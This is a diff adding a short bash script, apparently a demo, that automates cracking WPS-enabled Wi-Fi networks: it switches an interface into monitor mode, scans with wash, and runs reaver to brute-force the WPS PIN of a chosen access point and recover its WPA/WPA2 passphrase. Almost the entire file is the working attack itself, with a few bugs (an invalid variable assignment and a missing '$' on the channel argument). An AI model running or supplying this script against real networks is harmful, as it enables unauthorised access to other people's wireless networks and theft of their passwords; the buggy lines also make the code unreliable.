@@ -1,0 +1,31 @@
+#!/bin/bash
+echo "Script Description: This script is used to crack WPS passwords as follow : \n
+	 1-Enabling the monitor mode.
+	 2-Scanning for all the networks with WPS feature.
+	 3-Cracking the password."
+echo ~~Enabling monitor mode \"./Demo-1-Wireless-Cracking/EnablingMonitorMode\"
+./Demo-1-Wireless-Cracking/EnablingMonitorMode
+read -p "~~>Enter wireless interface name in monitor mode, press enter to continue with 'wlan0': " interfaceName
+ if [[ $interfaceName ]]
+then
+      interfaceName = $interfaceName
+else
+      interfaceName="wlan0"
+fi
+echo "~~Scanning for networks with WPS feature \"wash -i $interfaceName\""
+echo "~~Go to the second tab and enter the required information"
+echo -"~~Hit enter to stop the scanning"
+wash -i $interfaceName &
+echo ~~Enter the target network information:
+read -p ""
+killall -9 wash
+read -p "	Channel: " CH
+read -p "	InterfaceName: " interfaceName
+read -p "	BSSID: " BSSID
+
+echo "On average Reaver will recover the target AP’s plain text WPA/WPA2 passphrase in 4-10 hours, depending on the AP. In practice, it will generally take half this time to guess the correct WPS pin and recover the passphrase"
+echo ~~Starting \'reaver\' to brute force the PIN \"reaver -b $BSSID -c $CH -i $interfaceName\"
+reaver -b $BSSID -c CH -i $interfaceName
+
+
+
